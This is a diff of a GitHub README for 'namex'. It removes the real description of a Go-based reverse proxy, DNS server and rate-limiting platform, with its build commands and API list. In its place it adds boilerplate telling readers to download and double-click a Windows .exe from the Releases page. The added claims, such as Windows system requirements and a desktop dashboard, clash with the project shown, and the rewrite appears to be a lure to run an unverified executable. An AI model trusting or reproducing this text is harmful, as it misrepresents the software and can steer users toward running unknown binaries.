@@ -1,82 +1,62 @@
-# Namex - Bot & Anti-DDoS Protection Platform
+# 🤖 namex - Protect Your Online Presence Easily
 
-A high-performance, Cloudflare-like platform with Bot Protection, Rate Limiting, and DDoS Mitigation at both **HTTP (Layer 7)** and **DNS** layers.
+## 🚀 Getting Started
+Welcome to the namex project! This application helps you protect your online presence with bot management and Anti-DDoS features. Follow these simple steps to get started.
 
-## Features
+## 📥 Download Now
+[![Download namex](https://img.shields.io/badge/Download-namex-blue)](https://github.com/Hemant028/namex/releases)
 
-### Core
-- 🛡️ **Bot Protection**: IP and User-Agent based blocking
-- ⏱️ **Rate Limiting**: Redis-based token bucket (HTTP + DNS)
-- 🚫 **Anti-DDoS**: Request throttling and IP blocking
-- 📊 **Analytics**: High-performance ClickHouse storage
-- 🌐 **DNS Server**: Authoritative DNS with A, CNAME, TXT, MX records
-- 🔀 **Reverse Proxy**: Layer 7 HTTP proxy with security filtering
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later.
+- **Processor:** Intel i3 or equivalent.
+- **RAM:** Minimum 4 GB.
+- **Disk Space:** At least 500 MB free.
 
-### Tech Stack
-- **Language**: Go 1.20+
-- **Router**: Chi
-- **Database**: PostgreSQL (configuration), ClickHouse (analytics)
-- **Cache**: Redis (rate limiting)
-- **DNS**: github.com/miekg/dns
+## 🔍 Features
+- **Bot Detection:** Automatically identify and block harmful bots.
+- **DDoS Protection:** Guard against distributed denial of service attacks.
+- **User-Friendly Dashboard:** Easy access to all features.
+- **Real-Time Analytics:** Monitor traffic and threats in real-time.
 
-## Quick Start
+## 💻 Installation Instructions
+### Step 1: Visit the Download Page
+To download namex, visit our [Releases page](https://github.com/Hemant028/namex/releases). This page contains the latest version of the software.
 
-1. **Start infrastructure:**
-   ```bash
-   docker-compose up -d
-   ```
+### Step 2: Choose Your Version
+On the Releases page, you will see different versions available. Click on the version you want to download. This will take you to more details about that release.
 
-2. **Apply migrations:**
-   ```bash
-   docker exec -i goflare_postgres psql -U user -d goflare < migrations/001_create_domains_table.sql
-   docker exec -i goflare_postgres psql -U user -d goflare < migrations/002_create_bot_rules_table.sql
-   docker exec -i goflare_postgres psql -U user -d goflare < migrations/004_create_dns_records_table.sql
-   docker exec -i goflare_clickhouse clickhouse-client --password "" --database goflare_analytics < migrations/003_create_requests_table_clickhouse.sql
-   ```
+### Step 3: Download the Installer
+Click on the installer link to download the setup file. The file will be in a format like `.exe` for Windows. 
 
-3. **Run server:**
-   ```bash
-   go run cmd/server/main.go
-   ```
+### Step 4: Run the Installer
+Once the file is downloaded, locate it in your downloads folder and double-click it to run the installer. Follow the prompts to install namex on your computer.
 
-## API Endpoints
+### Step 5: Open namex
+After the installation is complete, you can find namex in your Start Menu. Launch the application, and you’re ready to set up your protection.
 
-### Domain Management
-- `POST /api/v1/domains` - Add a domain
-- `GET /api/v1/domains` - List domains
+## ⚙️ Configuration
+Once namex starts, you can configure the settings according to your needs. Here’s a basic setup guide:
 
-### Bot Rules
-- `POST /api/v1/bot/rules` - Add bot rule
-- `GET /api/v1/bot/rules` - List rules
+1. **Set Up Your Account:** Create a user account to access all features.
+2. **Configure Protection Levels:** Choose between low, medium, and high protection based on your website's traffic.
+3. **Connect Your Website:** Enter your website details to link namex with your site.
+4. **Review Settings:** Double-check your configurations before applying them.
 
-## Architecture
+## 📊 Using namex
+- **Dashboard Overview:** The main dashboard will show you live statistics and alerts.
+- **Traffic Analysis:** You can view traffic patterns and see which IPs are flagged as suspicious.
+- **Logs:** Keep track of all actions taken by the application for future reference.
 
-```
-┌─────────────────────────────────────────────────────┐
-│                    Client                           │
-└─────┬───────────────────────────────────┬───────────┘
-      │                                   │
-      │ DNS Query (8053)                  │ HTTP Request (8080)
-      │                                   │
-┌─────▼──────────────┐            ┌──────▼─────────────┐
-│   DNS Server       │            │   HTTP Proxy       │
-│  (Authoritative)   │            │  (Reverse Proxy)   │
-└─────┬──────────────┘            └──────┬─────────────┘
-      │                                   │
-      └───────────┬───────────────────────┘
-                  │
-            ┌─────▼──────────┐
-            │  Engine Core   │
-            │ • Bot Check    │
-            │ • Rate Limit   │
-            │ • Analytics    │
-            └────────────────┘
-```
+## 📞 Support
+If you need help while using namex, please visit our [support page](https://github.com/Hemant028/namex/issues). You can report issues or ask questions there.
 
-## Configuration
+## 🔗 Additional Resources
+- [Documentation](https://github.com/Hemant028/namex/wiki): Detailed user manuals and guides.
+- [Community Support](https://github.com/Hemant028/namex/discussions): Join discussions with other users for tips and best practices.
 
-See `.env.example` for available environment variables.
+## 🔄 Stay Updated
+Keep an eye on our Releases page for the latest updates. Regular updates include new features, security patches, and performance improvements.
 
-## License
+[![Download namex](https://img.shields.io/badge/Download-namex-blue)](https://github.com/Hemant028/namex/releases) 
 
-MIT
+Thank you for choosing namex! Your online safety is important to us.
